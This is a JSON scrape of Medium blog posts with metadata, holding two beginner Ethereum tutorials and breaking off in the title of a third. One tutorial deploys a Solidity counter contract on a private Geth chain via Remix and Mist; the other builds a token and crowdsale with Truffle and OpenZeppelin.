[{"title": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014 Tutorial", "post_link": "https://codeburst.io/build-your-first-ethereum-smart-contract-with-solidity-tutorial-94171d6b1c4b?source=search_post---------0", "author_name": "Pete Humiston", "author_link": "https://codeburst.io/@petehumiston", "publish_date": "2017-11-12", "last_modified_date": "2018-07-07", "readtime": "23.3", "claps": 5283, "voters": 702, "content": "Build Your First Ethereum Smart Contract with Solidity\u200a\u2014 TutorialPete HumistonFollowNov 12, 2017 \u00b7 24 min readSo you wanna build a smart contract? Perhaps you want to understand how they work, maybe you want to build your own Dapp, maybe you want to launch the very first billion dollar ICO (sarcasm)... Regardless of your intentions, learning how smart contracts work is invaluable. The Ethereum platform possesses enormous potential to create Dapps that could change the way we interact on the web in the decades to come. While Ethereum deploys smart contracts that work much like a standard blockchain transaction, they yield a conditional statement that must be met before a function(s) is executed. Smart contracts can be used for voting, crowdfunding, blind auctions, multi-signature wallets and MUCH more.Don\u2019t Forget to Check out Part 1 of my Smart Contract Attacks Series!A Quick Smart Contract Example:Bob has his own scrap metal depot business in the United States, Eric is his iron scrap supplier. Eric is based out of China. Bob and Eric have a GREAT business relationship. They trust each other and have been doing business for a long time. Both have booming businesses, and Bob in particular sells out of iron scrap on a routine basis. Bob deploys a contract where once his iron scrap inventory reaches a certain range, he automatically sends an order out to Eric for X lbs of iron scrap at Y ether per ton. Eric agrees to the arrangement and accepts Bob\u2019s payment in ether right away. Eric gets to work right away and starts fulfilling Bob\u2019s order. Eric can exchange his ether at a local exchange online for Yuan for a tiny fee and it\u2019ll be processed instantaneously. Whether Eric decides to hold ether or convert to Yuan is his choice, but either way he can now put this capital to work right away!Both parties are ecstatic! Typically Bob has to contact his bank and request a money wire to be sent to Eric\u2019s bank in China. It typically takes ~48 hours to process the wire transfer, at which point Eric will have to wait another few days for his bank to clear the payment. Not only that, Bob\u2019s bank is going to charge him a fee for wiring money to Eric\u2026 Time and money out the window. To make matters worse, both parties have to deal with the headache of foreign exchange, turning the US Dollars into Chinese Yuan.So What Am I Going to Learn?As the saying goes, \u201cyou have to crawl before you can walk\u201d. Before we get to deploying our first contract it\u2019s important we learn a few basics. More importantly, I\u2019d like to point out that Ethereum\u2019s platform launched in 2016. While still in it\u2019s infancy, now is the perfect time to start learning about smart contracts.In this tutorial we\u2019re going to learn about:Ethereum NodesBuilding A Private Blockchain NetworkMetaMask Browser Plug InMist BrowserEthereum WalletWeb3 Ethereum JavaScript APIRemix Web Browser IDEGeth (Go Ethereum) Command Line InterfaceSolidity Programming LanguageImportant: If at any point you run into an issue with running a program, try launching it as administrator by right clicking on it and selecting \u201cRun as administrator\u201d.Setting Up An Ethereum NodeIn the simplest form, an Ethereum node is any device that is running the Ethereum protocol (blockchain). While nodes are typically running on desktops & laptops, development for mobile is on going. When we connect to the Ethereum protocol we are on the Ethereum blockchain network and are running a node. By running an Ethereum node we can connect to other nodes in the network, have direct access to the blockchain, and even do things like mine blocks, send transactions, and deploy smart contracts.Nodes are written in Go (Go Ethereum/Geth), C++, and Python. In this tutorial we\u2019re going to stick to the most popular of the three, Go. Important to also note that by downloading Geth we are downloading the ENTIRE Ethereum blockchain. That said, make sure you have ~35GBs of storage on your hard drive before continuing.Visit the Go Ethereum website and install GethVisit here: https://geth.ethereum.org/downloads/2. Download the latest release of Geth (currently 1.8.7) for Windows, make sure you download the 64-bit version.Geth Ethereum Downloadable Releases3. Once your download is complete, open the installer and click \u201cI Agree\u201d4. Make sure the Geth box is checked and click \u201cNext\u201d5. You\u2019ll be prompted to select a destination folder for your download. By default, Geth will install under C:\\Program Files\\Geth6. Close installation once complete7. Open up command prompt (I\u2019ll be using Git Bash \u2014 download here: https://git-scm.com/ , do make sure you add to PATH variables during installation) and navigate to the Geth directory by typing \u201ccd C:\\Program Files\\Geth\u201dGeth Path File8. Begin syncing to the Ethereum blockchain by typing \u201cGeth\u201d. Because this is your first sync you\u2019ll download the ENTIRE blockchain from other peers. This will take some time so get comfy\u2026What you\u2019ll see when launching Geth for the first time (post download)Done? Right on! You\u2019re now running an Ethereum Node. Let the fun begin\u2026Establishing Our Own Private Ethereum NetworkNow that we have access to the Ethereum protocol via our node, we\u2019re going to setup our own private server to develop & deploy our smart contract. Note that none of this will actually be deployed on the Ethereum blockchain, instead we\u2019ll deploy on our own blockchain. We\u2019ll start by initializing the very first block in our blockchain, the genesis block (genesis.json).Create a new folder on your desktop called \u201cPrivate Chain\u201d.Open command prompt in this folder and create a data directory folder for our chaindata by typing \u201cMkdir chaindata\u201d. You can open a command prompt in this folder by holding shift and right clicking, then select \u201copen command window here\u201d.Next, we need to create and save our genesis.json block in our Private Chain folder, as the genesis block will be used to initialize our private network and store data in the data directory folder \u201cchaindata\u201d.Open up notepad, copy & paste the code below into a new file called \u201cgenesis.json\u201d and save this file in our Private Chain folder.Learn more about genesis.json parameters visit the link below: https://ethereum.stackexchange.com/questions/2376/what-does-each-genesis-json-parameter-mean{  \"coinbase\"   : \"0x0000000000000000000000000000000000000001\",  \"difficulty\" : \"0x20000\",  \"extraData\"  : \"\",  \"gasLimit\"   : \"0x2fefd8\",  \"nonce\"      : \"0x0000000000000042\",  \"mixhash\"    : \"0x0000000000000000000000000000000000000000000000000000000000000000\",  \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\",  \"timestamp\"  : \"0x00\",  \"alloc\": {},  \"config\": {        \"chainId\": 15,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    }}5. Now we want to initialize our private network in the chaindata directory by using our genesis.json file. We\u2019re going to tell Geth we want the data directory in the \u201cchaindata\u201d directory and where the genesis.json file can be found (make sure genesis.json is NOT in chaindata folder). Type the following command into the cmd line pointing to the Private Chain folder.geth --datadir=./chaindata/ init ./genesis.json6. You should then see that the genesis state was successfully written.7. Now we can start Geth and connect to our own private chain. As you will see the geth.ipc endpoint socket connection will be opened and so will port 30303.geth --datadir=./chaindata/Whenever we start Geth the IPC endpoint will open, which is used to process connections to Geth with programs like MetaMask, Ethereum Wallet, Mist, or for opening the Geth Javascript API console. We will discuss all of these next.Alright, alright, alright! We now have established our very own private geth network!What Is MetaMask Exactly?MetaMask is both an Ethereum browser and a wallet. Through MetaMask you can interact with Dapps and smart contracts on the web without having to download the blockchain or install any software. You simply add MetaMask to chrome as an extensions, create a wallet, and deposit ether. While currently only available for Chrome, expect to see a launch for Firefox in the near future.The biggest downfall to Metamask is that like any online wallet, you must trust MetaMask. The possibility of MetaMask being hacked or leaking your private key does exists, for your information is stored online.You can download MetaMask here: https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn?hl=enThe Mist BrowserMist is an electron application, meaning that its a desktop hybrid app with a web interface as well. This allows for faster development and changes of the Mist interface and helps with the browser part of Mist. Its important that you recognize Mist is in beta, so expect to run into a few issues here and there.Mist is powerful in that it includes a Geth node that runs in the background upon launch; a connection to the Ethereum blockchain is made right away. But because we want to practice developing a smart contract, we are going to run a node on our private network and will not need Mist to connect to the default Geth node.Read more about Mist: https://github.com/ethereum/mist/wikiWhat About The Ethereum Wallet?The Ethereum Wallet is just a Mist implementation that can only access a single Dapp \u2014 the wallet dapp, this is due to missing features in Mist. The Ethereum Wallet is written in pure HTML and Javascript code, makes use of web3.js to manage your accounts, and runs inside of the Mist browser. You can also download a standalone version if prefered. The wallet is not yet official released, bugs will exist.Ethereum Wallet: https://github.com/ethereum/meteor-dapp-walletLet\u2019s Download the Mist Browser & Connect To Our Private NetworkLet\u2019s take a second to download the Mist browser so we can connect with our private network.Navigate to the Mist download page and download the latest version of the Mist installer \u2014 https://github.com/ethereum/mist/releases2. Open the installer and click \u201cI Agree\u201d3. Confirm the download path C:\\Program Files\\Mist (default) by clicking \u201cNext\u201d4. Confirm the blockchain data to be stored at the default path under ..\\Roaming\\Ethereum and click \u201cInstall\u201dFeel free to open Mist and mess around with the UI to get a better feel for things, but we\u2019ll be opening up Mist shortly.Connecting Mist To Our Private NetworkNow that we knocked out initializing our private network with the genesis block, we can open a command line in our Private Chain folder and tell Geth to connect to our datadir. Type the following command into command prompt:geth --datadir=./chaindata/Geth will now start running and once we open Mist the geth.ipc endpoint will open; Mist will then make the connection to our private network. Make sure Mist is connected by confirming \u201cPrivate-Net\u201d exists in the upper right corner of the Mist launch window.Ignore \u201cLooking for peers\u201d, remember we\u2019re on our own network so you\u2019ll never connect to any other peers.The Basics Of MistLet\u2019s open up Mist and familiarize ourselves with a few things:At the top we can see our tool bar. Navigating to \u201cEthereum Node\u201d under the \u201cDevelop\u201d tab will show that we are NOT connect to Geth, as it is grayed out \u2014 we\u2019re running our own network. Much like Chrome, under the \u201cDevelop\u201d tab we can also access \u201cDeveloper Tools\u201d2. On the left side of the Mist browser we can see the various different tabs that are open, just like any other browser. By clicking on the green box we are opening the Ethereum Wallet. The wallet is a distributed application that makes it incredibly easy to interact with the JavaScript interface of Go Ethereum3. As you can see we\u2019re connected to the Ethereum wallet through https://wallet.ethereum.org/ , don\u2019t forget that Mist is simply a browser. From here we can do things like see past transactions, send ether, and even deploy or watch contracts.4. Under the \u201cWallets\u201d tab we can see our accounts, add new accounts, create wallet contracts (like single owner accounts, multi-signature wallet contracts, and even import wallets), and also examine past transactions5. Let\u2019s create an account by clicking \u201cAdd Account\u201d (synonymous with \u201cwallet\u201d), then \u201cCreate new account\u201d, and enter a super safe password (even though this is an account on our private network and will not be connected to the actual Ethereum network, it\u2019s a good habit). Click \u201cOK\u201d and create your walletUnder the \u201cSend\u201d tab we can send ether from one wallet to another, or even from a wallet to a contract. As you can see below, before hitting send we\u2019re given the option to set the gas (fee) for our transaction. All transactions require some amount of gas to incentivize processing. Depending on how fast we want to get the transaction processed and approved by the blockchain, we can adjust the amount of gas.Lastly, under the \u201cContracts\u201d tab we can deploy new contracts, watch existing contracts, and watch previously created tokens. Here is where we will create and deploy our \u201cHello World!\u201d contract.We can also see the option to watch contracts & tokens. If we have interest in interacting with a previous deployed contract, we can click on \u201cWatch Contracts\u201d and enter in the name of the contract, contract address, and the contract ABI (application binary interface). If we have interest in watching or spending ERC-20 tokens (tokens developed on the Ethereum blockchain), we can also input the token contract address, token name, and token symbol.Now for one of the more exciting parts\u2026 If we move over to the explorer tab (blue box w/ magnifying glass) we\u2018ll see that a browser with an address bar opens up at the top and a web page loads. If we click \u201cconnect\u201d in the upper right hand corner of the screen, we can connect the browser to our wallet. We\u2019 will have then connected to \u201cWeb 3.0\u201d and from here we can visit Ethereum powered distributed applications (Dapps) and use our wallet to interact with them. Try it out for yourself and visit https://www.stateofthedapps.com/ to see a few examples. Pretty cool, huh? As I mentioned before, this is all still relatively new so try and use your imagination for where this all could go\u2026just don\u2019t get lost in space\u2026you gotta come back and finish the rest of this tutorial\u2026Because we\u2019re on our private network, we will be able to connect our wallet to the browser but we do not have any real ether. Thus, we\u2019ll be limited to what we can do when interacting with these Dapps. In order to get the full experience you\u2019ll need to connect to the Ethereum network and deposit ether into your wallet, but that doesn\u2019t mean we can\u2019t browse.Web3.js?! What the???You might be asking yourself \u201chow is Mist able to connect a wallet to a browser and interact with the Ethereum blockchain?\u201d Mist is merely a browser, a browser injected with Web3.js library and can communicate with an Ethereum node or transact with a smart contract deployed on the blockchain. The Web3.js library communicates with an Ethereum node through JSON RPC calls by connecting to an HTTP or IPC connection.If you would like to learn more about Web3.js, feel free to visit the GitHub documentation here at: https://github.com/ethereum/wiki/wiki/JavaScript-APILet\u2019s Take A Breather For A Second\u2026Okay, so I\u2019ve thrown a lot at you so far. While a lot of it may not have stuck on the first go, I urge you to keep going. Next we\u2019ll be interacting with the Remix web IDE, write our first smart contract in solidity, deploy through Mist, and even interact with it.If something wasn\u2019t explained clearly or maybe I missed something, feel free to drop a comment down below! I\u2019m always happy to clear up any confusion and answer questions you may have. As always, Google is always a safe source for more information.Remix Web Browser IDELet\u2019s jump right into things and start writing our some code! While we can write directly into Mist, we\u2019re going to first write our Solidity code in the Remix web browser IDE. Why? Well, Remix has a handful of features that makes for a more comprehensive development experience (for now). It is typically best used for smaller sized contracts. Remix features include:Integrated debugger (step by step, instructions, monitoring variables, call data, call stack)Warnings such as unsafe code, gas cost, whether functions could be constant, and checks for overlapping variable namesIntegrated testing & deployment environmentStatic analysisSyntax & error highlightingWorks with injected Web3 objectsCan deploy directly to MetaMask or MistLets make our way over to Remix by visiting: https://remix.ethereum.org/Smack dab right in the middle of the page we can see our space for our code. In the upper left of the screen we can see a few different file options available: \u201cCreate New File\u201d, \u201cAdd Local File\u201d, \u201cPublish All Open Files to an Anonymous Github Gist\u201d, \u201cCopy All Files to Another Instance\u201d, and lastly \u201cConnect to Localhost\u201d. We can also see a list of current contracts under development.On the upper right side of our screen we have several tabs to select from. Our \u201cCompile\u201d tab allows for us to compile our contract once complete (set to Auto compile by default). If we click on \u201cdetails\u201d we get a list of several contract details ranging from metadata, to bytecode, to ABI, and even our contract\u2019s Web3 deployment code.The \u201cSettings\u201d, \u201cDebugger\u201d, \u201cAnalysis\u201d, and \u201cSupport\u201d tabs all have their use case and are worth familiarizing yourself with. In the interest of time we\u2019re going to be using the \u201cRun\u201d tab for the rest of this tutorial. If we click on the \u201cRun\u201d tab we can see a few different contract settings.Environment: There are 3 type of environments Remix can be plugged to. Both the Web3 Provider and Injected Web3 environments require external tools like MetaMask or Mist. JavaScript VM is what we\u2019ll stick to, as it will allow for execution to take place in our browser, in addition to our deployment in Mist.Account: Remix provides 5 different accounts with 100 Ether preloaded! These can be used during contract development if desired.Gas limit: Set a limit forthe amount of gas (fee) attached to the contract.Gas Price: Set a required amount of gas for the contract.Value: Deploy the contract with X amount of ether attached.Finally\u2026Hands On Solidity!For those of you familiar with Javascript I\u2019m sure you\u2019ll take notice to the overlaps with Solidity. Much like JS, Solidity is a contract-oriented, high-level language that is designed to target the Ethereum Virtual Machine (EVM). The code is statically typed, supports inheritance, libraries and complex user-defined types among other features.In our \u201cHello World!\u201d contract we\u2019re going to create a state variable called counter and assign it a starting value of 5. Then we\u2019re going to create a function that increases our state variable by 1, a function that decreases the variable by 1, a function that returns our counter , and lastly a function that will destroy the contract.The first bit of code that we\u2019ll type into Remix is the source code version. At the time of writing this Solidity 0.4.16 is the latest version that is recognized by Mist. We\u2019re going to call this version by typing at the top of our contract:pragma solidity ^0.4.16;The keyword pragma is called that way because generally pragmas are instructions for the compiler about how to treat the source code.More info on Solidity can be found here in the docs: https://solidity.readthedocs.io/en/develop/index.htmlFunctions & StatesLooking at the bare bones of a smart contract we can see that contracts are merely collections of code (its functions) and data (its states) that correspond to a specific contract address on the blockchain.For example, the line uint256 counter; sets the variable counter of type uint256 (unsigned integer of 256 bits). It can now be thought of as a single slot in a database that can be pulled by calling the function of the code that manages the database. We can even set a value for the variable counter while also setting the type as uint256.uint256 counter = 5;State variables are typically outside of functions, making them global variables, and usually are the first few lines in our contract. We\u2019ve now managed to set our variable counter as an uint256 and a value of 5. If we want to call a function to increase the value of counter by 1, we\u2019re going to create a function (we\u2019ll call it \u201cadd\u201d) and tell it to add 1 to counter .function add() public {  counter++;}After calling the function \u201cadd()\u201d, counter will have a value of 6.Building Out The ContractLets create our \u201cHello World!\u201d contract by first creating a contract called such:pragma solidity ^0.4.16;contract HelloWorld { }We can now include that counter state variable that we talked about early. Remember, we\u2019re going to assigning this state variable as an unsigned integer of 256 bits (unsigned meaning that this type can only be positive integers, not positive and negative. 256 bits in size is a design of the Ethereum Virtual Machine). Oh yeah, also set it to a value of 5.pragma solidity ^0.4.16;contract HelloWorld {    uint256 counter = 5;  }Go ahead and see if you can create 2 functions below this state variable assignment. We need 1). a function that increases counter by 1 and 2). a function that decreases the counter by 1.pragma solidity ^0.4.16;contract HelloWorld {  uint256 counter = 5; //state variable we assigned earlier function add() public {  //increases counter by 1  counter++; }  function subtract() public { //decreases counter by 1  counter--; }  }You\u2019ll see from the code above that we assigned both functions the modifier public . Since Solidity knows two kinds of function calls (internal ones that do not create an actual EVM call \u2014 also called a \u201cmessage call\u201d \u2014 and external ones that do), there are four types of visibilities for functions and state variables. Functions can be specified as being external, public, internal or private, the default is public . Aside from the fact that Remix will throw a warning message stating that no visibility is specified and it\u2019s defaulting to public , typing out the function visibility is a good habit to get into. It will allow us to better understand the contract settings when evaluating our code.We\u2019re getting close, but not quite there. Our state variable can change depending on the function we call, but we need a function that will output the value of counter . Try creating a function called \u201cgetCounter()\u201d that will return counter. This will be a read only action, so we need to tell our function that we\u2019ll be returning a constant. Additionally, when returning a state variable we must tell our function the type that is being returned, in this case we\u2019re returning an uint256 as discussed earlier.pragma solidity ^0.4.16;contract HelloWorld {  uint256 counter = 5; //state variable we assigned earlierfunction add() public {  //increases counter by 1  counter++; }  function subtract() public { //decreases counter by 1  counter--; } function getCounter() public constant returns (uint256) {  return counter;    } }While calling a functions on the Ethereum network will require a small amount of gas to be spent, no gas is required when returning a constant function.Awesome! So now we have a contract that allows us to change the value of our global variable counter . We can also increase it by 1, decrease it by 1, and return the value of our counter whenever we want. Let\u2019s give it a whirl\u2026Let\u2019s Test This ThangSo your code should be in Remix and \u201cAuto compile\u201d should be checked by default under the \u201cCompile\u201d tab. Make your way over to the \u201cRun\u201d tab. Default settings will have the environment set to JavaScript VM, an account will be selected, gas limit will be 3000000, and your gas price & value will be 0. Click on \u201cCreate\u201d under your \u201cRun\u201d tab. You should now see your contract created just like below.Notice the amount of ether on our account ticked down slightly from 100 after creating the contract.Right off the bat you can see the 3 functions that we had created \u2014 \u201cadd\u201d, \u201csubstract\u201d, and \u201cgetCounter\u201d. You can also see that our state variable has a value assigned to it of 5. Now, click \u201cadd\u201d to increase our counter by 1. Then go ahead and click \u201cgetCounter\u201d to call our newly modified counter . You should see the value has been updated to 6. Try it again for \u201csubtract\u201d.WOOHOO! Give yourself a pat on the back. You just done did it. Contract created!Deploying Contracts in MistNow that we\u2019ve tested and confirmed our code in Remix, let\u2019s start up Mist (make sure it\u2019s connected to the Private Network) and deploy it on our private network. Navigate to the \u201cContracts\u201d tab of the Ethereum Wallet in Mist. Then select \u201cDeploy New Contract\u201d and paste our code from Remix into the source code box.Before we can proceed any further, we need to have ether in our wallet. We can mine for ether on our private network by running the miner. We\u2019ll do this through the Geth JavaScript console.Open up ANOTHER command prompt window pointing to your private network folder (C:/users/name/desktop/private network) and type geth attach . Hit enter. You will see a Geth JavaScript console generated and you can now enter commands into Geth directly. Let\u2019s begin mining for some ether by typing miner.start(); . You will see that the console returns \u201cnull\u201d and mining has begun! Take a look at your wallet on Mist, you\u2019ll see increments of 5 ether continuously added to your wallet. You can stop the miner anytime by typing miner.stop(); in console\u2026or you can continue to mine fake ether\u2026whatever makes you happy!Learn more about JS console commands here: https://github.com/ethereum/go-ethereum/wiki/JavaScript-ConsoleNow move back to the \u201cContracts\u201d tab, \u201cDeploy New Contract\u201d, make sure our code is in the source code box. To the right of the source code box select \u201cHello World\u201d as the contract to deploy, then click deploy.After you have entered your password, make your way back over to the wallets tab. Scroll down to \u201cLastest Transactions\u201d and you will see the contract we just deployed. You\u2019ll also notice that the contract shows 0 of 12 confirmations and is stuck in a perpetual state of \u201ccreating contract\u201d.The reason our contract hasn\u2019t been fully created is that there are no miners on our network confirming our newly deployed contract. Start mining again in the Geth JavaScript console we opened earlier ( miner.start(); ). Once we start mining again we will see that the number of confirmations will start to tick up, eventually fully deploying our contract.Now click on the contract name. From here we can do all sorts of things. We can transfer ether to the contract, copy the contract address, generate a QR code to be scanned, get the contracts interface (ABI), and even execute contract functions.As you can see our \u201cHello World\u201d contract is displaying our getCounter() function with the counter state variable of 5. Make your way over to \u201cselect function\u201d and select either \u201cadd\u201d or \u201csubtract\u201d function. Once selected, hit \u201cexecute\u201d. Do not forget, we\u2019re the only ones on our private network so we need to confirm the transaction by running our miner!And there we have it! Our contract has executed the subtract function and returned a value of \u201c4\u201d. We now have a live smart contract on our private Ethereum blockchain network that can be interacted with on Mist!Bonus: Adding a Self-Destruct FunctionAs mentioned above, when contracts are deployed they are officially added to the Ethereum blockchain and anyone with the contract address can interact with the contract, to a certain degree that is. What if we as the owner decide we want to remove the contract from the blockchain? Fortunately, Solidity offers an incredibly easy, maybe perhaps too easy, method for putting an end to the contract. We can perform the selfdestruct operation. When we selfdestruct the contract, all remaining Ether stored at the contract address is sent to a designated target and the contract is no more.While we want to have the optionality for destroying the contract, we want to make sure that such operation can only be performed by the creator of the contract. It could be CATASTROPHIC to neglect assigning selfdestruct privileges to a certain person(s). We need to first tell our contract who the owner of the contract is, which is the msg.sender . Go ahead and set the state variable owner as msg.sender . Because the msg.sender is associated with an address, we also need to tell Solidity that the state variable is going to be assigned as an address.pragma solidity ^0.4.16;contract HelloWorld {  uint256 counter = 5; //state variable we assigned earlier address owner = msg.sender; //set owner as msg.sender ........}We\u2019re going to call the self-destruct function \u201ckill\u201d and are also going to create a conditional if statement to ensure that the person executing the kill function is infact the owner. We will also set selfdestruct(owner); to tell the contract to send all contract funds back to the owner of the contract.pragma solidity ^0.4.16;contract HelloWorld {  uint256 counter = 5; //state variable we assigned earlier address owner = msg.sender; //set owner as msg.senderfunction add() public {  //increases counter by 1  counter++; }  function subtract() public { //decreases counter by 1  counter--; } function getCounter() public constant returns (uint256) {  return counter;    }  function kill() public { //self-destruct function,    if(msg.sender == owner) {    selfdestruct(owner);         }}We can now go back into Mist and redeploy a new contract with the kill() function added. To see the kill() function in full force, we\u2019re going to deploy the new contract, send ether to the contract, and then initialize kill() and see our ether return back to our wallet. Likewise, we also need to create a function that is executed whenever our contract receives Ether. In order to receive Ether, a fallback function must be marked payable in the contract. If such a function does not exist, the contract cannot receive Ether. A contract can have exactly one unnamed function, which is going to be the unnamed function that we\u2019ll mark as payable . Add the function below to our contract, the function can be placed below the kill() function.function () public payable {  }Great, now our contract can receive Ether from any wallet that has the contract\u2019s address! Go ahead and click \u201cDeploy\u201d to deploy our new contract and submit your password. Do make sure your miner is running to confirm the transaction. Once complete, go to the contract and click \u201cCopy address\u201d. You will get a warning message reminding you that you\u2019re on a test network, select \u201ccopy anyway\u201d.Let\u2019s Send Some Ether\u2026Awesome, we\u2019ve copied our contract\u2019s address and now we can send over some Ether to test our kill() function. Click on the \u201cSend\u201d tab and copy the contract address into the \u201cto\u201d field. Enter in however much ether you\u2019d like to send for this test, I\u2019m going to send over ~30,000 Ether.You know the routine by now\u2026scroll down and click \u201csend\u201d, turn on your miner, and wait for the transaction to get processed. You should notice right away your wallet no longer holds the ether we sent to the contract. Open the contract AGAIN under your \u201cContracts\u201d tab, you\u2019ll see that the contract now has ether attached to it. Select the kill function under the \u201cSelect function\u201d drop down and go ahead and self-destruct that bad boy. Enter your password, crank that miner. After 12/12 confirmations have been processed, your wallet will be restored with the Ether we sent to the contract. Now the contract is inoperable, but the contract\u2019s history does still exist on the blockchain.All In A Day\u2019s Work\u2026Aaaaaaandddd there you have it. Congrats on finishing the tutorial and having deployed (and killed) your very first smart contract! There is a lot that was covered here, surely somethings are still a bit of a head scratch. That\u2019s okay! You now know how to open a private network, write Solidity code, deploy in Mist & Remix, and interact with it. Plenty more to do and learn now that you know the basics.I hope this tutorial was helpful! If you have any questions, would like more tutorials to be released, or have any questions , drop em\u2019 down in the comments section below. \u201cClaps\u201d are also greatly appreciated!-PeteBTC: 17VWQpZHJqDJDZiiofKZvYhLQWFVHVseeGETH: 0x84787233aabe3899440655df04e9bee7596eaf17LTC: LVbJ1igmzqsNLcYsC8m2PouGEuyqvYj5RG\u2709\ufe0f Subscribe to CodeBurst\u2019s once-weekly Email Blast, \ud83d\udc26 Follow CodeBurst on Twitter, view \ud83d\uddfa\ufe0f The 2018 Web Developer Roadmap, and \ud83d\udd78\ufe0f Learn Full Stack Web Development.", "responses": 68, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Blockchain", "Coding"]}, {"title": "How To Create Token and Initial Coin Offering Contracts Using Truffle + Zeppelin Solidity", "post_link": "https://medium.com/zeppelin-blog/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6?source=search_post---------1", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-05-18", "last_modified_date": "2018-12-26", "readtime": "4.13", "claps": 2538, "voters": 453, "content": "How To Create Token and Initial Coin Offering Contracts Using Truffle + Zeppelin SolidityGustavo (Gus) GuimaraesFollowMay 18, 2017 \u00b7 5 min readUpdate: this blog post has been updated for OpenZeppelin Solidity version v2.0I have tested this blog post with the following dependencies:- node@10.11.0- truffle@v4.1.14- ganache-cli@v6.1.8- zeppelin-solidity@2.0.0Token contracts are hot. Token crowd sales aka Initial Coin Offers(ICO) are hotter. There have been a lot going in terms of ICOs lately in the crypto world and if you would like to code one yourself, look no further. In this blog post I am going to go through the steps to create your own and only token as well as the ICO contract for it. We will also use the help of some clever tools.Caveat: You should not actually release your ICO with the code found here. It is for demo purposes only. But it is a good start.For this tutorial I am going to be using Truffle and Zeppelin Solidity. Truffle is the de facto framework for creating smart contracts and decentralized applications. Zeppelin Solidity is a library that has extensive and well tested smart contracts that adhere to security best practices. In the smart contract world where a small bug can cost you money, it is good not to reinvent the wheel when there are trusted solutions out there.We will also use ganache-cli as the blockchain node because it is fast and developer friendly.Side note: If you want to actually create the contract on the Ethereum testnet or main net you would have to use something like Geth or Parity.Moving on: provided that you have npm and node installed, from terminal type the commands:$ npm install -g ganache-cli$ npm install -g truffle$ mkdir my-ico && cd my-ico$ truffle init$ npm install openzeppelin-solidity@2.0.0A lot of magic happened with those commands above. But in essence it is the setup that will get you up and running with creating and deploying your ICO smart contract.This adds the openzeppelin-solidity folder to node_modules and in it you will find all smart contract templates from the OpenZeppelin Solidity library.First step is to create the token contract.touch contracts/GustavoCoin.solAnd for the code:How simple is that?!That is a straightforward token contract. We practically let Zeppelin Solidity smart contract templates do all the heavy duty for us. Here we reference MintableToken . The idea is to have a token where the supply is controlled by an owner who can emit tokens and assign them. For a better look at what this contract does, check it at node_modules/zeppelin-solidity/contracts/token/ERC20/MintableToken.sol .The following step is to create the Crowdsale contract.touch contracts/GustavoCoinCrowdsale.solWe are basically going to inherit the contract at node_modules/zeppelin-solidity/contracts/crowdsale/emission/MintedCrowdsale.sol and node_modules/zeppelin-solidity/contracts/crowdsale/validation/TimedCrowdsale.sol. We end up with only the code below.Beautiful, huh? We are using the secure contracts provided by Zeppelin Solidity to our advantage. Note that GustavoCoinCrowdsale inherits from TimedCrowdsale and MintedCrowdsale. In order to deploy GustavoCoinCrowdsale , we must give a few parameters to its constructor function as per the Crowdsale and TimeCrowdsale contracts, i.e. openingTime and closingTime timestamps, the rate of token per ether rate, the token address itself and the wallet address of the contract owner(s).Let\u2019s deploy this contract. Open a new terminal tab and run$ ganache-cliIt will run ganache-cli. We are using it for our development needs.First, let\u2019s add this to truffle.js file. It is for configuration purposes:truffle.js:module.exports = {    networks: {        development: {            host: \"localhost\",            port: 8545,            network_id: \"*\" // Match any network id        }    }};Then, go on (you may need to create it) to the file migrations/2_deploy_contracts.js and modify it to this:Note that we are not deploying GustavoCoin . This is because once GustavoCoinCrowdsale deploys it will create GustavoCoin . Now back to the terminal tab where you installed Truffle, run the commands:$ truffle compile$ truffle migrateIf you happen to look at the ganache-cli tab you will see that the contract was deployed successfully.Alright, let\u2019s buy some GUS tokens.Run $ truffle consoleThis will open truffle console and we are going to use the web3.js API to interact with the deployed contract.// The account that will buy GUS tokens. It will show differently in your ganache-cli console> purchaser = web3.eth.accounts[2]'0xddac5d057c79facd674bc95dfd9104076fd34d6b'// The address of the GUS token instance that was created when the crowdsale contract was deployed// assign the result of GustavoCoinCrowdsale.deployed() to the variable crowdsale> GustavoCoinCrowdsale.deployed().then(inst => { crowdsale = inst })undefined> crowdsale.token().then(addr => { tokenAddress = addr } )undefined> tokenAddress'0x87a784686ef69304ac0cb1fcb845e03c82f4ce16'> gustavoCoinInstance = GustavoCoin.at(tokenAddress)...// add minter role to crowdsale so it is able to mint tokens during crowdsale> gustavoCoinInstance.addMinter(crowdsale.address)...// now check the number of GUS tokens purchaser has. It should be 0> gustavoCoinInstance.balanceOf(purchaser).then(balance => balance.toString(10))'0'// Buying GUS tokens> GustavoCoinCrowdsale.deployed().then(inst => inst.sendTransaction({ from: purchaser, value: web3.toWei(5, \"ether\")})){ tx: '0x68aa48e1f0d0248835378caa1e5b2051be35a5ff1ded82878683e6072c0a0cfc',  receipt:   { transactionHash: '0x68aa48e1f0d0248835378caa1e5b2051be35a5ff1ded82878683e6072c0a0cfc',     transactionIndex: 0,     blockHash: '0xb48ceed99cf6ddd4f081a99474113c4c16ecf61f76625a6559f1686698ee7d57',     blockNumber: 5,     gasUsed: 68738,     cumulativeGasUsed: 68738,     contractAddress: null,     logs: [] },  logs: [] }undefined// Check the amount of GUS tokens for purchaser again. It should have some now.> gustavoCoinInstance.balanceOf(purchaser).then(balance => purchaserGusTokenBalance = balance.toString(10))'5000000000000000000000'// When we created our token we made it with 18 decimals, which the same as what ether has. That's a lot of zeros, let's display without the decimals:> web3.fromWei(purchaserGusTokenBalance, \"ether\")'5000'Yay! It worked.Where to go after here you ask?You could test this code on the Ethereum testnet, or you could create a web app that would allow users to interact with the CrowdsaleToken contract, you could add more functionality to the contract itself such as deadline, token cap, etc. Unleash your inner token creator.The Ethereum community grows by the day and though there are not many tools out there yet, the ones such as Truffle and Zeppelin Solidity do a great job at improving developer\u2019s experience.I am curious to know what you will be coding from here.By the way, here is the repo containing the code for this blog post.I want to leave my gratitude for Francisco Giordano for reviewing the code used in this blog post.", "responses": 72, "tags": ["Ethereum", "Truffle", "ICO", "Open Zeppelin", "Guide"]}, {"title": "Solidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the 